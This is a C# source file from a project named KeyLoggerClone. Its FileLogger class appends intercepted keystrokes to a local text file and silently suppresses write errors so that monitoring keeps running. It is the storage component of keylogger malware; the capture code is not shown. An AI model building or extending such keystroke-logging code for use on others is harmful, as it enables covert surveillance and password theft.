using System.IO;
using KeyLoggerClone.Formatters;

namespace KeyLoggerClone.Loggers
{
    /// <summary>
    /// Writes intercepted and formatted keystrokes to a local text file.
    /// </summary>
    public class FileLogger : BaseLogger
    {
        private readonly string _filePath;

        public FileLogger(string filePath, IKeyFormatter formatter) : base(formatter)
        {
            _filePath = filePath;
            
            // Ensure directory exists
            var directory = Path.GetDirectoryName(filePath);
            if (!string.IsNullOrEmpty(directory) && !Directory.Exists(directory))
            {
                Directory.CreateDirectory(directory);
            }
        }

        protected override void Write(string formattedKey)
        {
            try
            {
                // Appending text in a thread-safe manner (lock is handled in BaseLogger)
                File.AppendAllText(_filePath, formattedKey);
            }
            catch
            {
                // Suppress errors during execution to avoid crashing monitored state
            }
        }

        public override void Flush()
        {
            // Direct file writing does not require explicit flushing
        }
    }
}
